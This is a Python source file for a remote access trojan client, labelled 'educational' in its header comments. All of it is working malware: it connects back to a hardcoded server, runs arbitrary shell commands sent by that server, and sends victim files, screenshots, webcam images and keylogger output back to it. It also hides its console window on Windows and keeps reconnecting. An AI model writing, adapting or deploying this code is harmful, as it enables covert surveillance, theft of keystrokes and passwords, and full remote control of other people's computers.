#!/usr/bin/env python3
# ⚠️ Ce projet est à but pédagogique uniquement. Toute utilisation non autorisée est strictement interdite.
# Educational RAT Client - For learning purposes only
# This program should only be used in controlled test environments

import socket
import subprocess
import os
import platform
import time
import sys
import base64
import ipaddress
from threading import Thread
import logging
import json

# Global variables
SERVER_HOST = "10.25.117.168"  # Change this to your server IP
SERVER_PORT = 4444         # Default port (must match server)
BUFFER_SIZE = 4096
CONNECTION_RETRY = 10      # Seconds between connection attempts
AUTH_USERNAME = "admin"    # Default username for authentication
AUTH_PASSWORD = "password" # Default password for authentication

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("client_log.txt"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Try to import screenshot functionality, but continue if not available
try:
    import pyautogui
    SCREENSHOT_AVAILABLE = True
    logger.info("Screenshot functionality is available")
except ImportError:
    SCREENSHOT_AVAILABLE = False
    logger.warning("Screenshot functionality not available. Install pyautogui for screenshots.")

# Try to import webcam functionality, but continue if not available
WEBCAM_AVAILABLE = False
try:
    import cv2
    WEBCAM_AVAILABLE = True
    logger.info("Webcam functionality is available")
except ImportError:
    logger.warning("Webcam functionality not available. Install opencv-python for webcam access.")

# Try to import keylogger functionality
KEYLOGGER_AVAILABLE = False
try:
    from pynput import keyboard
    KEYLOGGER_AVAILABLE = True
    logger.info("Keylogger functionality is available")
except ImportError:
    logger.warning("Keylogger functionality not available. Install pynput for keylogging.")

def encrypt_data(data):
    """Simple encryption function (for educational purposes only)"""
    # Convert to bytes if it's a string
    if isinstance(data, str):
        data = data.encode()
    
    # Use base64 for basic obfuscation
    return base64.b64encode(data)

def decrypt_data(data):
    """Simple decryption function (for educational purposes only)"""
    # Decrypt base64
    return base64.b64decode(data)

def secure_send(sock, data):
    """Send encrypted data to the server"""
    try:
        if isinstance(data, str):
            data = data.encode()
        encrypted_data = encrypt_data(data)
        sock.send(encrypted_data)
        return True
    except Exception as e:
        logger.error(f"Error sending encrypted data: {e}")
        return False

def secure_recv(sock, buffer_size=BUFFER_SIZE):
    """Receive and decrypt data from the server"""
    try:
        encrypted_data = sock.recv(buffer_size)
        if not encrypted_data:
            return None
        decrypted_data = decrypt_data(encrypted_data)
        return decrypted_data.decode()
    except Exception as e:
        logger.error(f"Error receiving encrypted data: {e}")
        return None

def authenticate(client_socket):
    """Authenticate with the server"""
    try:
        # Receive auth request
        auth_request = secure_recv(client_socket)
        if auth_request == "AUTH":
            # Send credentials
            credentials = json.dumps({
                "username": AUTH_USERNAME,
                "password": AUTH_PASSWORD
            })
            secure_send(client_socket, credentials)
            
            # Get authentication response
            response = secure_recv(client_socket)
            if response == "AUTH_SUCCESS":
                logger.info("Authentication successful")
                return True
            else:
                logger.error("Authentication failed")
                return False
        return False
    except Exception as e:
        logger.error(f"Authentication error: {e}")
        return False

def ping_host(host):
    """Ping the host to check if it's reachable"""
    param = '-n' if platform.system().lower() == 'windows' else '-c'
    command = ['ping', param, '1', host]
    try:
        return subprocess.call(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
    except:
        return False

def test_connection(host, port):
    """Test connectivity to the server and provide diagnostic information"""
    logger.info(f"Testing connection to {host}:{port}...")
    
    # First, check if we can ping the host
    if not ping_host(host):
        logger.error(f"Cannot ping {host}. Host may be down or not accepting ICMP packets.")
    
    # Check if we're trying to connect to localhost from possibly another machine
    is_local_ip = False
    try:
        ip_obj = ipaddress.ip_address(host)
        is_local_ip = ip_obj.is_loopback
    except:
        if host in ["localhost", "127.0.0.1"]:
            is_local_ip = True
    
    if is_local_ip:
        logger.warning("Using localhost/127.0.0.1 - this only works if client and server are on the same machine")
        logger.warning("For different machines, the server needs to use its LAN IP address")
    
    # Test TCP connection
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        s.close()
        logger.info("Connection successful! Server is reachable.")
        return True
    except ConnectionRefusedError:
        logger.error("Connection refused. The server is not running or is blocking connections.")
        logger.info("Troubleshooting steps:")
        logger.info("    1. Make sure the server is running")
        logger.info("    2. Check that the server IP and port are correct")
        logger.info("    3. Check Windows Firewall settings and allow Python in the rules")
        logger.info(f"    4. Verify the port {port} is not blocked")
        return False
    except socket.timeout:
        logger.error("Connection timed out. The server might be:")
        logger.info("    1. Behind a firewall")
        logger.info("    2. On a different network segment")
        logger.info("    3. IP address might be incorrect")
        return False
    except socket.gaierror:
        logger.error(f"Address error. Unable to resolve hostname {host}")
        logger.info("    Please use an IP address instead of a hostname")
        return False
    except Exception as e:
        logger.error(f"Connection error: {str(e)}")
        return False

def get_system_info():
    """Get system information for identification"""
    system = platform.system()
    info = {
        "System": system,
        "Node": platform.node(),
        "Release": platform.release(),
        "Version": platform.version(),
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Username": os.getlogin() if hasattr(os, 'getlogin') else 'Unknown'
    }
    
    # Get more detailed OS-specific information
    if system == "Windows":
        try:
            import wmi
            c = wmi.WMI()
            os_info = c.Win32_OperatingSystem()[0]
            info["OS"] = f"{os_info.Caption} {os_info.OSArchitecture}"
        except:
            pass
    
    return " | ".join([f"{k}: {v}" for k, v in info.items()])

def execute_command(command):
    """Execute a shell command and return its output"""
    # Determine appropriate shell based on OS
    shell = True if platform.system() == "Windows" else False
    
    try:
        # Split command into parts for Linux/Mac
        cmd_parts = command.split() if not shell else command
        
        # Execute the command
        process = subprocess.Popen(
            cmd_parts, 
            shell=shell,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )
        
        # Get command output
        stdout, stderr = process.communicate()
        
        if stderr:
            result = stderr.decode()
        else:
            result = stdout.decode()
            
        # Handle empty output
        if not result:
            result = "[+] Command executed successfully (no output)"
            
        return result
        
    except Exception as e:
        return f"[!] Error executing command: {str(e)}"

def upload_file(client_socket, file_path):
    """Upload a file to the server"""
    try:
        if not os.path.exists(file_path):
            secure_send(client_socket, "File not found")
            return
        
        # Get file size and send it to server
        file_size = os.path.getsize(file_path)
        secure_send(client_socket, str(file_size).zfill(10))
        
        # Wait for server to be ready
        response = secure_recv(client_socket)
        
        if response == "ready":
            # Send the file in chunks
            with open(file_path, "rb") as f:
                data = f.read(BUFFER_SIZE)
                while data:
                    client_socket.send(encrypt_data(data))  # Encrypt each chunk
                    data = f.read(BUFFER_SIZE)
            
            return True
        return False
        
    except Exception as e:
        logger.error(f"Error uploading file: {e}")
        return False

def download_file(client_socket, file_path):
    """Download a file from the server"""
    try:
        # Get file size
        file_size_data = secure_recv(client_socket)
        file_size = int(file_size_data)
        
        # Tell server we're ready to receive
        secure_send(client_socket, "ready")
        
        # Receive file data
        received_data = b""
        remaining_bytes = file_size
        
        while remaining_bytes > 0:
            data = client_socket.recv(min(BUFFER_SIZE, remaining_bytes))
            if not data:
                break
                
            # Decrypt each chunk
            decrypted_data = decrypt_data(data)
            received_data += decrypted_data
            remaining_bytes -= len(decrypted_data)
        
        # Save the file
        with open(file_path, "wb") as f:
            f.write(received_data)
            
        secure_send(client_socket, "[+] File downloaded successfully")
        return True
        
    except Exception as e:
        secure_send(client_socket, f"[!] Error downloading file: {str(e)}")
        return False

def take_screenshot(client_socket):
    """Capture screen and send to server"""
    if not SCREENSHOT_AVAILABLE:
        secure_send(client_socket, "FAIL")
        return
    
    try:
        # Take screenshot based on OS
        if platform.system() == "Windows" or platform.system() == "Darwin":  # Windows or macOS
            screenshot = pyautogui.screenshot()
        else:  # Linux
            try:
                import pyscreenshot as ImageGrab
                screenshot = ImageGrab.grab()
            except ImportError:
                screenshot = pyautogui.screenshot()
        
        # Convert to bytes
        import io
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        screenshot_data = img_bytes.getvalue()
        
        # Send screenshot size to server
        size = len(screenshot_data)
        secure_send(client_socket, "PASS")
        secure_send(client_socket, str(size).zfill(10))
        
        # Wait for server ready signal
        secure_recv(client_socket)
        
        # Send screenshot data
        client_socket.sendall(encrypt_data(screenshot_data))
        
    except Exception as e:
        secure_send(client_socket, "FAIL")
        logger.error(f"Error taking screenshot: {e}")

def capture_webcam(client_socket):
    """Capture an image from webcam and send to server"""
    if not WEBCAM_AVAILABLE:
        secure_send(client_socket, "FAIL")
        logger.warning("Webcam capture failed: OpenCV not available")
        return
    
    try:
        # Initialize webcam
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            secure_send(client_socket, "FAIL")
            logger.warning("Failed to open webcam")
            return
            
        # Capture a frame
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            secure_send(client_socket, "FAIL")
            logger.warning("Failed to capture image from webcam")
            return
        
        # Convert to JPG
        ret, buffer = cv2.imencode('.jpg', frame)
        if not ret:
            secure_send(client_socket, "FAIL")
            return
            
        jpg_data = buffer.tobytes()
        
        # Send image size to server
        size = len(jpg_data)
        secure_send(client_socket, "PASS")
        secure_send(client_socket, str(size).zfill(10))
        
        # Wait for server ready signal
        secure_recv(client_socket)
        
        # Send image data
        client_socket.sendall(encrypt_data(jpg_data))
        
    except Exception as e:
        secure_send(client_socket, "FAIL")
        logger.error(f"Error capturing webcam: {e}")

class Keylogger:
    def __init__(self):
        self.log_file = os.path.join(os.environ.get('TEMP', '/tmp'), 'keylog.txt')
        self.listener = None
        self.running = False
    
    def on_press(self, key):
        try:
            with open(self.log_file, 'a') as f:
                if hasattr(key, 'char'):
                    f.write(key.char)
                else:
                    f.write(f'[{key}]')
        except Exception as e:
            logger.error(f"Error logging key: {e}")
    
    def start(self):
        if not KEYLOGGER_AVAILABLE:
            logger.warning("Keylogger not available: pynput not installed")
            return False
        
        if self.running:
            return True
            
        try:
            # Start keylogger in a non-blocking way
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.running = True
            return True
        except Exception as e:
            logger.error(f"Error starting keylogger: {e}")
            return False
    
    def stop(self):
        if self.running and self.listener:
            self.listener.stop()
            self.running = False
    
    def get_logs(self):
        if not os.path.exists(self.log_file):
            return "No keylog data available"
            
        try:
            with open(self.log_file, 'r') as f:
                logs = f.read()
                
            # Optionally clear the log file after reading
            with open(self.log_file, 'w') as f:
                pass
                
            return logs
        except Exception as e:
            logger.error(f"Error reading keylog file: {e}")
            return f"Error reading keylog: {str(e)}"

def main():
    """Main function to run the client"""
    global SERVER_HOST
    global SERVER_PORT
    
    # Test connectivity first
    test_connection(SERVER_HOST, SERVER_PORT)
    
    # Initialize keylogger
    keylogger = Keylogger()
    
    # Periodically try to connect to the server
    while True:
        try:
            logger.info(f"Attempting to connect to {SERVER_HOST}:{SERVER_PORT}...")
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_HOST, SERVER_PORT))
            logger.info(f"Connected to {SERVER_HOST}:{SERVER_PORT}")
            
            # Authenticate with the server
            if not authenticate(client):
                logger.error("Authentication failed. Retrying in 10 seconds.")
                client.close()
                time.sleep(CONNECTION_RETRY)
                continue
            
            while True:
                # Receive and decrypt command
                command = secure_recv(client)
                
                if not command:
                    # Connection lost
                    logger.warning("Connection lost. Attempting to reconnect...")
                    break
                    
                # Handle specific commands
                if command == "sysinfo":
                    # System information
                    response = get_system_info()
                    secure_send(client, response)
                    
                elif command.startswith("download"):
                    # Send file to server
                    _, file_path = command.split(" ", 1)
                    upload_file(client, file_path)
                    
                elif command.startswith("upload"):
                    # Receive file from server
                    _, file_path = command.split(" ", 1)
                    download_file(client, file_path)
                    
                elif command == "screenshot":
                    # Take screenshot and send to server
                    take_screenshot(client)
                
                elif command == "webcam":
                    # Capture image from webcam
                    capture_webcam(client)
                
                elif command == "keylogger_start":
                    # Start keylogger
                    if keylogger.start():
                        secure_send(client, "[+] Keylogger started")
                    else:
                        secure_send(client, "[!] Failed to start keylogger")
                
                elif command == "keylogger_stop":
                    # Stop keylogger
                    keylogger.stop()
                    secure_send(client, "[+] Keylogger stopped")
                
                elif command == "keylogger_dump":
                    # Get keylogger data
                    logs = keylogger.get_logs()
                    secure_send(client, logs)
                    
                elif command == "exit":
                    # Exit command from server
                    keylogger.stop()  # Ensure keylogger is stopped
                    client.close()
                    sys.exit(0)
                    
                else:
                    # Execute shell command
                    response = execute_command(command)
                    secure_send(client, response)
                    
        except Exception as e:
            logger.error(f"Connection error: {str(e)}")
            # If connection fails, wait and retry
            time.sleep(CONNECTION_RETRY)
            continue
            
        # If we get here, the loop has broken - wait and retry
        time.sleep(CONNECTION_RETRY)

if __name__ == "__main__":
    logger.info(f"Starting client on {platform.system()} with Python {platform.python_version()}")
    
    # Hide console window on Windows if possible
    if platform.system() == "Windows":
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except:
            pass
    
    main() 